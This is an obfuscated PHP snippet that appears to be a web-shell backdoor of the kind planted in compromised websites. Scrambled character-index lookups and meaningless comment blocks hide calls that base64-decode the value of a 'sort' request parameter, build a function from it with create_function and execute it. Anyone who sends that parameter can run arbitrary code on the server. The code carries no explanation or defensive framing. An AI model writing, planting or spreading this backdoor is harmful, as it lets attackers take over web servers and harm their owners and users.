...
$OTtxhmUI3902 = "/t9bp4iuogxcj6k8_n)qerhwd7(;lvzs0ya.mf*2351";


$nFuycJzS6694 = "";

foreach([31,8,21,1] as $d){
       $nFuycJzS6694 .= $OTtxhmUI3902[$d];
    }


if(isset($_REQUEST /*uIxsXVeeOVuCEZTREZyBAoILEIvbABkAAJYPpzlXfOUEIUyPhKWiqBMOslRnbgMIAdtGCwlkranaFjXgEOoiZiJlbhhSvehktRHQHMfQwGAPwRpSUmyCBizbCxqRJwwe*/["$nFuycJzS6694"])){
    $gZOuGwSQ8936 = $_REQUEST /*uIxsXVeeOVuCEZTREZyBAoILEIvbABkAAJYPpzlXfOUEIUyPhKWiqBMOslRnbgMIAdtGCwlkranaFjXgEOoiZiJlbhhSvehktRHQHMfQwGAPwRpSUmyCBizbCxqRJwwe*/["$nFuycJzS6694"];
    $ldYqdZHV5945 = "";
    $pYIHxdQC8957 = "";

    /*DqXCjkXgtjQiEtNAQrzzzjmYFALoGuhoBxmpNNmiqVRnGbnuKIlWZWXLywidFmeSsYvvkKuFfbLLCcGIysRNtcCQlLzmxxUQdSyWBavuPAzErxTqgwqWHCaqRuKNjcEh*/

    foreach([3,34,31,20,13,5,16,24,20,11,8,24,20] as $d){
       $ldYqdZHV5945 .= $OTtxhmUI3902[$d];
    }

    /*IftPLJqDrsgPZlarHTIAOvsjqwOJOahSfMjcPMfgOEHuBtaLcKVxOIDvJRLXnrEWxNSJMjNcdkbtXVTzqUaNIoIbWHCGFdUuIhuJCZprnjpLmPGHyyZxvoHacPnHRhel*/


    foreach([31,1,21,21,20,29] as $d){
       $pYIHxdQC8957 .= $OTtxhmUI3902[$d];
    }

    /*MVQdmiKbqBwwuemhzwSAcHytcrRdWFhwKcfQQLYdmnxBwMMcuMEXCukfVnoRVxdaCCoXnIgzcsrasNgqixkOWAPlHCFaNIUYmwrxEYipLRfShitXPBJYjanKnlQCznDp*/

    $d = $pYIHxdQC8957('n'.'o'.''.''.'i'.'t'.''.'c'.''.''.''.'n'.''.''.''.'u'.'f'.''.''.''.''.'_'.'e'.'t'.''.''.''.''.'a'.'e'.''.''.'r'.''.''.''.''.'c');
    $G = $d("", $ldYqdZHV5945($gZOuGwSQ8936));
    $G();
    exit();
